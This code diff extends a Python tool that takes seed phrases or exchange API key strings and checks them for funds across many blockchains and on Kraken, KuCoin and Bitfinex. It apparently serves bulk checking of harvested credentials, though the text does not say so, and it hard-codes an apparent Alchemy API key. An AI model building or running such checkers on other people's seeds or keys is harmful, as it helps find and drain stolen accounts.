@@ -4,6 +4,9 @@ import json
 import logging
 import random
 import time
+import hmac
+import hashlib
+import base64
 
 logger = logging.getLogger(__name__)
 from bip_utils import (
@@ -24,33 +27,48 @@ RPC_URLS = {
     "BSC": [
         "https://bnb-mainnet.g.alchemy.com/v2/tTv5fdlUEgRX7S6mFtkF8",
         "https://bsc-dataseed.binance.org/",
-        "https://bsc-dataseed1.defibit.io/",
         "https://rpc.ankr.com/bsc"
     ],
     "POLYGON": [
         "https://polygon-rpc.com/",
-        "https://rpc-mainnet.maticvigil.com/",
         "https://rpc.ankr.com/polygon"
     ],
     "ETH": [
         "https://eth-mainnet.g.alchemy.com/v2/tTv5fdlUEgRX7S6mFtkF8",
         "https://cloudflare-eth.com/",
-        "https://eth-mainnet.public.blastapi.io/",
         "https://rpc.ankr.com/eth"
     ],
     "SOL": [
         "https://solana-mainnet.g.alchemy.com/v2/tTv5fdlUEgRX7S6mFtkF8",
         "https://api.mainnet-beta.solana.com",
-        "https://solana-mainnet.phantom.app/",
         "https://rpc.ankr.com/solana"
     ],
-    "SOL_DEVNET": ["https://api.devnet.solana.com"]
+    "ARBITRUM": [
+        "https://arb1.arbitrum.io/rpc",
+        "https://rpc.ankr.com/arbitrum"
+    ],
+    "OPTIMISM": [
+        "https://mainnet.optimism.io",
+        "https://rpc.ankr.com/optimism"
+    ],
+    "AVALANCHE": [
+        "https://api.avax.network/ext/bc/C/rpc",
+        "https://rpc.ankr.com/avalanche"
+    ],
+    "FANTOM": [
+        "https://rpc.ftm.tools/",
+        "https://rpc.ankr.com/fantom"
+    ]
 }
 
 USDT_CONTRACTS = {
     "ETH": "0xdac17f958d2ee523a2206206994597c13d831ec7",
     "BSC": "0x55d398326f99059ff775485246999027b3197955",
-    "POLYGON": "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"
+    "POLYGON": "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",
+    "ARBITRUM": "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",
+    "OPTIMISM": "0x94b008aa21185010605a48c994c1d561c349aba3",
+    "AVALANCHE": "0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7",
+    "FANTOM": "0x049d68029688eabf473097a2fc38ef61633a3c7a"
 }
 # ────────────────────────────────────────────────────────────────────────────
 
@@ -188,21 +206,30 @@ async def check_btc(session, addr):
         except Exception: pass
         return []
 
-async def check_evm_full(session, addr):
+async def check_evm_full(session, addr, target_net=None):
     results = []
-    for net, urls in RPC_URLS.items():
+    networks = [target_net] if target_net else ["ETH", "BSC", "POLYGON", "ARBITRUM", "OPTIMISM", "AVALANCHE", "FANTOM"]
+    
+    for net in networks:
+        urls = RPC_URLS.get(net)
+        if not urls: continue
+        
         data = await _rpc_call(session, urls, "eth_getBalance", [addr, "latest"])
         if data and 'result' in data:
-            bal = int(data['result'], 16) / 10**18
-            if bal > 0: results.append((net, addr, bal))
+            try:
+                bal = int(data['result'], 16) / 10**18
+                if bal > 0: results.append((net, addr, bal))
+            except: pass
         
         contract = USDT_CONTRACTS.get(net)
         if contract:
-            call_data = "0x70a08231" + addr[2:].zfill(64)
-            t_data = await _rpc_call(session, urls, "eth_call", [{"to": contract, "data": call_data}, "latest"])
-            if t_data and 'result' in t_data and t_data['result'] != '0x':
-                t_bal = int(t_data['result'], 16) / 10**6
-                if t_bal > 0: results.append((f"USDT_{net}", addr, t_bal))
+            try:
+                call_data = "0x70a08231" + addr[2:].zfill(64)
+                t_data = await _rpc_call(session, urls, "eth_call", [{"to": contract, "data": call_data}, "latest"])
+                if t_data and 'result' in t_data and t_data['result'] != '0x':
+                    t_bal = int(t_data['result'], 16) / 10**6
+                    if t_bal > 0: results.append((f"USDT_{net}", addr, t_bal))
+            except: pass
     return results
 
 async def check_solana(session, addr):
@@ -263,9 +290,78 @@ async def check_trx(session, addr):
             except Exception: continue
         return results
 
+# ── CEX INTEGRATIONS ──────────────────────────────────────────────────────────
+
+async def check_kraken(session, api_key, api_secret):
+    if not api_key or not api_secret: return []
+    url = "https://api.kraken.com/0/private/Balance"
+    nonce = str(int(time.time() * 1000))
+    postdata = f"nonce={nonce}"
+    path = "/0/private/Balance"
+    encoded = (nonce + postdata).encode()
+    message = path.encode() + hashlib.sha256(encoded).digest()
+    signature = hmac.new(base64.b64decode(api_secret), message, hashlib.sha512)
+    sigdigest = base64.b64encode(signature.digest()).decode()
+    headers = {"API-Key": api_key, "API-Sign": sigdigest}
+    try:
+        async with session.post(url, data=postdata, headers=headers, timeout=REQUEST_TIMEOUT) as res:
+            if res.status == 200:
+                data = await res.json()
+                if not data.get("error"):
+                    return [("KRAKEN", asset, float(bal)) for asset, bal in data["result"].items() if float(bal) > 0]
+    except Exception: pass
+    return []
+
+async def check_kucoin(session, api_key, api_secret, api_passphrase):
+    if not api_key or not api_secret: return []
+    url = "https://api.kucoin.com/api/v1/accounts"
+    now = str(int(time.time() * 1000))
+    str_to_sign = now + "GET" + "/api/v1/accounts"
+    signature = hmac.new(api_secret.encode(), str_to_sign.encode(), hashlib.sha256)
+    sig = base64.b64encode(signature.digest()).decode()
+    headers = {"KC-API-KEY": api_key, "KC-API-SIGN": sig, "KC-API-TIMESTAMP": now, "KC-API-PASSPHRASE": api_passphrase, "KC-API-KEY-VERSION": "2"}
+    try:
+        async with session.get(url, headers=headers, timeout=REQUEST_TIMEOUT) as res:
+            if res.status == 200:
+                data = await res.json()
+                if data.get("code") == "200000":
+                    return [("KUCOIN", acc["currency"], float(acc["balance"])) for acc in data["data"] if float(acc["balance"]) > 0]
+    except Exception: pass
+    return []
+
+async def check_bitfinex(session, api_key, api_secret):
+    if not api_key or not api_secret: return []
+    url = "https://api-pub.bitfinex.com/v2/auth/r/wallets"
+    nonce = str(int(time.time() * 1000))
+    auth_payload = f"/api/v2/auth/r/wallets{nonce}"
+    signature = hmac.new(api_secret.encode(), auth_payload.encode(), hashlib.sha384).hexdigest()
+    headers = {"bfx-nonce": nonce, "bfx-apikey": api_key, "bfx-signature": signature}
+    try:
+        async with session.post(url, headers=headers, timeout=REQUEST_TIMEOUT) as res:
+            if res.status == 200:
+                data = await res.json()
+                return [("BITFINEX", w[1], float(w[2])) for w in data if float(w[2]) > 0]
+    except Exception: pass
+    return []
+
+# ── MAIN ORCHESTRATOR ────────────────────────────────────────────────────────
+
 async def check_balance_all(seed):
     seed = seed.strip()
     if not seed: return None
+    
+    # Se for uma API Key (formato key:secret ou similar), trata como CEX
+    if ":" in seed and len(seed) > 30:
+        parts = seed.split(":")
+        async with aiohttp.ClientSession() as session:
+            if len(parts) == 2: # Kraken ou Bitfinex
+                res = await asyncio.gather(check_kraken(session, parts[0], parts[1]), check_bitfinex(session, parts[0], parts[1]))
+            elif len(parts) == 3: # KuCoin (Key:Secret:Passphrase)
+                res = [await check_kucoin(session, parts[0], parts[1], parts[2])]
+            else: res = []
+            found = [item for sublist in res for item in sublist]
+            return (seed, found) if found else None
+
     addr_map = await get_universal_addresses(seed)
     if not addr_map: return None
 
